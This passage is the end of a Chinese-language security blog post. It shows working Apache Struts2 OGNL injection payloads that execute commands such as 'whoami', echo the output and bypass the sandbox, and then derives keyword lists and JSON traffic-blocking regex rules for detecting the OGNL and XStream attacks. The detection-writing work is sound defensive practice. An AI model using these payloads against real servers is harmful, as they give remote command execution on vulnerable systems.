</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023mycmd</span><span class=err>\</span><span class=n>u003d</span><span class=err>\&#39;</span><span class=n>calc</span><span class=err>\&#39;&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mycmd</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 或者一些基于上面思想的带回显POC
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023context</span><span class=o>[</span><span class=err>\&#39;</span><span class=n>xwork</span><span class=o>.</span><span class=na>MethodAccessor</span><span class=o>.</span><span class=na>denyMethodExecution</span><span class=err>\&#39;</span><span class=o>]</span><span class=err>\</span><span class=n>u003dfalse</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>.</span><span class=na>excludeProperties</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.util.Collections@EMPTY_SET</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>kxlzx</span><span class=o>)(</span><span class=n>kxlzx</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023_memberAccess</span><span class=o>.</span><span class=na>allowStaticMethodAccess</span><span class=err>\</span><span class=n>u003dtrue</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023mycmd</span><span class=err>\</span><span class=n>u003d</span><span class=err>\&#39;</span><span class=n>whoami</span><span class=err>\&#39;&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myret</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@java.lang.Runtime@getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mycmd</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>A</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mydat</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>DataInputStream</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myret</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>())</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>B</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023myres</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40byte</span><span class=o>[</span><span class=n>51020</span><span class=o>]</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>C</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mydat</span><span class=o>.</span><span class=na>readFully</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myres</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>D</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023mystr</span><span class=err>\</span><span class=n>u003dnew</span><span class=err>\</span><span class=n>40java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>(</span><span class=err>\</span><span class=n>u0023myres</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=err>&#39;\</span><span class=n>u0023myout</span><span class=err>\</span><span class=n>u003d</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=o>()</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>)(</span><span class=n>bla</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=n>E</span><span class=o>)((</span><span class=err>&#39;\</span><span class=n>u0023myout</span><span class=o>.</span><span class=na>getWriter</span><span class=o>().</span><span class=na>println</span><span class=o>(</span><span class=err>\</span><span class=n>u0023mystr</span><span class=o>)</span><span class=err>&#39;</span><span class=o>)(</span><span class=n>bla</span><span class=o>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 后续还出现了利用OgnlUtil关闭沙箱的POC
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>%{(</span><span class=err>#</span><span class=n>dm</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=o>).(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>?(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=err>#</span><span class=n>dm</span><span class=o>):((</span><span class=err>#</span><span class=n>container</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>com</span><span class=o>.</span><span class=na>opensymphony</span><span class=o>.</span><span class=na>xwork2</span><span class=o>.</span><span class=na>ActionContext</span><span class=o>.</span><span class=na>container</span><span class=err>&#39;</span><span class=o>]).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>=</span><span class=err>#</span><span class=n>container</span><span class=o>.</span><span class=na>getInstance</span><span class=o>(</span><span class=nd>@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class=o>)).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>.</span><span class=na>getExcludedPackageNames</span><span class=o>().</span><span class=na>clear</span><span class=o>()).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>.</span><span class=na>getExcludedClasses</span><span class=o>().</span><span class=na>clear</span><span class=o>()).(</span><span class=err>#</span><span class=n>context</span><span class=o>.</span><span class=na>setMemberAccess</span><span class=o>(</span><span class=err>#</span><span class=n>dm</span><span class=o>)))).(</span><span class=err>#</span><span class=n>cmd</span><span class=o>=</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=o>).(</span><span class=err>#</span><span class=n>iswin</span><span class=o>=(</span><span class=nd>@java.lang.System@getProperty</span><span class=o>(</span><span class=err>&#39;</span><span class=n>os</span><span class=o>.</span><span class=na>name</span><span class=err>&#39;</span><span class=o>).</span><span class=na>toLowerCase</span><span class=o>().</span><span class=na>contains</span><span class=o>(</span><span class=err>&#39;</span><span class=n>win</span><span class=err>&#39;</span><span class=o>))).(</span><span class=err>#</span><span class=n>cmds</span><span class=o>=(</span><span class=err>#</span><span class=n>iswin</span><span class=o>?{</span><span class=err>&#39;</span><span class=n>cmd</span><span class=o>.</span><span class=na>exe</span><span class=sc>&#39;,&#39;</span><span class=o>/</span><span class=n>c</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>cmd</span><span class=o>}:{</span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>c</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>cmd</span><span class=o>})).(</span><span class=err>#</span><span class=n>p</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ProcessBuilder</span><span class=o>(</span><span class=err>#</span><span class=n>cmds</span><span class=o>)).(</span><span class=err>#</span><span class=n>p</span><span class=o>.</span><span class=na>redirectErrorStream</span><span class=o>(</span><span class=kc>true</span><span class=o>)).(</span><span class=err>#</span><span class=n>process</span><span class=o>=</span><span class=err>#</span><span class=n>p</span><span class=o>.</span><span class=na>start</span><span class=o>()).(</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>(</span><span class=err>#</span><span class=n>process</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>()))}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 后续对于沙箱绕过做了增黑名单防护，但是紧接着pwntester就绕过了
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>%{(</span><span class=err>&#39;</span><span class=n>Powered_by_Unicode_Potats0</span><span class=o>,</span><span class=n>enjoy_it</span><span class=err>&#39;</span><span class=o>).(</span><span class=err>#</span><span class=n>UnicodeSec</span> <span class=o>=</span> <span class=err>#</span><span class=n>application</span><span class=o>[</span><span class=err>&#39;</span><span class=n>org</span><span class=o>.</span><span class=na>apache</span><span class=o>.</span><span class=na>tomcat</span><span class=o>.</span><span class=na>InstanceManager</span><span class=err>&#39;</span><span class=o>]).(</span><span class=err>#</span><span class=n>potats0</span><span class=o>=</span><span class=err>#</span><span class=n>UnicodeSec</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=err>&#39;</span><span class=n>org</span><span class=o>.</span><span class=na>apache</span><span class=o>.</span><span class=na>commons</span><span class=o>.</span><span class=na>collections</span><span class=o>.</span><span class=na>BeanMap</span><span class=err>&#39;</span><span class=o>)).(</span><span class=err>#</span><span class=n>stackvalue</span><span class=o>=</span><span class=err>#</span><span class=n>attr</span><span class=o>[</span><span class=err>&#39;</span><span class=n>struts</span><span class=o>.</span><span class=na>valueStack</span><span class=err>&#39;</span><span class=o>]).(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>setBean</span><span class=o>(</span><span class=err>#</span><span class=n>stackvalue</span><span class=o>)).(</span><span class=err>#</span><span class=n>context</span><span class=o>=</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=err>&#39;</span><span class=n>context</span><span class=err>&#39;</span><span class=o>)).(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>setBean</span><span class=o>(</span><span class=err>#</span><span class=n>context</span><span class=o>)).(</span><span class=err>#</span><span class=n>sm</span><span class=o>=</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>get</span><span class=o>(</span><span class=err>&#39;</span><span class=n>memberAccess</span><span class=err>&#39;</span><span class=o>)).(</span><span class=err>#</span><span class=n>emptySet</span><span class=o>=</span><span class=err>#</span><span class=n>UnicodeSec</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=err>&#39;</span><span class=n>java</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>HashSet</span><span class=err>&#39;</span><span class=o>)).(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>setBean</span><span class=o>(</span><span class=err>#</span><span class=n>sm</span><span class=o>)).(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=err>&#39;</span><span class=n>excludedClasses</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>emptySet</span><span class=o>)).(</span><span class=err>#</span><span class=n>potats0</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=err>&#39;</span><span class=n>excludedPackageNames</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>emptySet</span><span class=o>)).(</span><span class=err>#</span><span class=n>exec</span><span class=o>=</span><span class=err>#</span><span class=n>UnicodeSec</span><span class=o>.</span><span class=na>newInstance</span><span class=o>(</span><span class=err>&#39;</span><span class=n>freemarker</span><span class=o>.</span><span class=na>template</span><span class=o>.</span><span class=na>utility</span><span class=o>.</span><span class=na>Execute</span><span class=err>&#39;</span><span class=o>)).(</span><span class=err>#</span><span class=n>cmd</span><span class=o>={</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=o>}).(</span><span class=err>#</span><span class=n>res</span><span class=o>=</span><span class=err>#</span><span class=n>exec</span><span class=o>.</span><span class=na>exec</span><span class=o>(</span><span class=err>#</span><span class=n>cmd</span><span class=o>))}</span>
</span></span></code></pre></td></tr></table></div></div><p>Struts2的漏洞中，除了Xstream反序列化，都是由于Ognl表达式注入造成的。</p><p>先分析Ognl表达式注入的特征，根据前面的POC分析可以知道，攻击流量可能会存在如下关键字（为了减少误报，尽量使用全限定名）：</p><ul><li>java.lang.ProcessBuilder</li><li>java.lang.System</li><li>java.lang.Runtime</li><li>org.apache.struts2.ServletActionContext</li><li>com.opensymphony.xwork2.dispatcher.HttpServletResponse</li><li>denyMethodExecution</li><li>_memberAccess</li><li>allowStaticMethodAccess</li><li>excludeProperties</li><li>ognl.OgnlContext</li><li>DEFAULT_MEMBER_ACCESS</li><li>com.opensymphony.xwork2.ActionContext.container</li><li>com.opensymphony.xwork2.ognl.OgnlUtil</li><li>struts.valueStack</li><li>org.apache.tomcat.InstanceManager</li><li>org.apache.commons.collections.BeanMap</li></ul><p>然后Xstream反序列化的那个POC的关键字为： <code>javax.imageio.spi.FilterIterator</code> ，且其Content-Type必须为application/xml。</p><p>针对Ognl表达式注入的整体的流量规则如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>19990110</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;test-struts2-poc&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;services&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;net&#34;</span><span class=p>:</span> <span class=s2>&#34;192.168.192.162&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;port&#34;</span><span class=p>:</span> <span class=mi>8585</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;reset_client,block_outbound&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;patterns&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;location&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;pattern&#34;</span><span class=p>:</span> <span class=s2>&#34;(((\\$|%){)|\\()((\\s|\\S)*?)(java\\.lang\\.ProcessBuilder|java\\.lang\\.System|java\\.lang\\.Runtime|org\\.apache\\.struts2\\.ServletActionContext|com\\.opensymphony\\.xwork2\\.dispatcher\\.HttpServletResponse|denyMethodExecution|_memberAccess|allowStaticMethodAccess|excludeProperties|ognl\\.OgnlContext|DEFAULT_MEMBER_ACCESS|com\\.opensymphony\\.xwork2\\.ActionContext\\.container|com\\.opensymphony\\.xwork2\\.ognl\\.OgnlUtil|struts\\.valueStack|org\\.apache\\.tomcat\\.InstanceManager|org\\.apache\\.commons\\.collections\\.BeanMap)((\\s|\\S)*?)(}|\\))&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>上述规则中，因为Struts2的攻击payload可能出现如下几个位置：</p><ul><li>URL中</li><li>Content-Type中</li><li>Content-Disposition中</li><li>POST以及GET请求的参数中</li></ul><p>所以流量规则的location为就得为 <code>[]</code> 。</p><p>针对Xstream的流量特征，其Content-Type必须要为 <code>application/xml</code> ，且存在 <code>javax.imageio.spi.FilterIterator</code> 关键字，所以其流量规则如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>19990111</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;test-struts2-xstream-poc&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;services&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;net&#34;</span><span class=p>:</span> <span class=s2>&#34;192.168.192.162&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;port&#34;</span><span class=p>:</span> <span class=mi>8585</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;reset_client,block_outbound&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;patterns&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;location&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;HEADER:Content-Type&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;pattern&#34;</span><span class=p>:</span> <span class=s2>&#34;application/xml&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;utf8&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;location&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;pattern&#34;</span><span class=p>:</span> <span class=s2>&#34;javax\\.imageio\\.spi\\.FilterIterator&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=参考>参考</h2><ul><li><a href=https://www.cnblogs.com/oumyye/p/4356149.html>https://www.cnblogs.com/oumyye/p/4356149.html</a></li><li><a href=https://xz.aliyun.com/t/2044>https://xz.aliyun.com/t/2044</a></li><li><a href=https://xz.aliyun.com/t/2323>https://xz.aliyun.com/t/2323</a></li><li><a href=https://mochazz.github.io/2020/06/28/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-003/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90>https://mochazz.github.io/2020/06/28/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-003/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></li><li><a href=https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%92%8C-%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB>https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%92%8C-%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB</a></li><li><a href=https://paper.seebug.org/1575/>https://paper.seebug.org/1575/</a></li><li><a href=https://www.cnblogs.com/lzh2012/p/5339161.html>https://www.cnblogs.com/lzh2012/p/5339161.html</a></li></ul></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
<span class=item-content>P1n93r</span></p><p class=copyright-item><span class=item-title>上次更新</span>
<span class=item-content>2021-06-15</span></p></div><footer class=post-footer><nav class=post-nav><a class=prev href=/post/security/springboot_actuator%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/><i class="iconfont icon-left"></i>
<span class="prev-text nav-default">springboot_actuator漏洞分析</span>
<span class="prev-text nav-mobile">上一篇</span></a>
<a class=next href=/post/security/thymeleaf%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/><span class="next-text nav-default">Thymeleaf安全研究</span>
<span class="next-text nav-mobile">下一篇</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="p1n93r",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:pin83r@gmail.com class="iconfont icon-email" title=email></a>
<a href=https://github.com/p1n93r class="iconfont icon-github" title=github></a>
<a href=https://p1n93r.github.io/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
<span class=division>|</span>
<span class=theme-info>主题 -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量 <span id=busuanzi_value_site_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次</span>
<span class=division>|</span>
<span id=busuanzi_container_site_uv>本站总访客数 <span id=busuanzi_value_site_uv><img src=/img/spinner.svg alt=spinner.svg></span> 人</span></div><span class=copyright-year>&copy;
2019 -
2022<span class=heart><i class="iconfont icon-heart"></i></span><span>P1n93r</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
<script type=text/javascript src=/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js></script></body></html>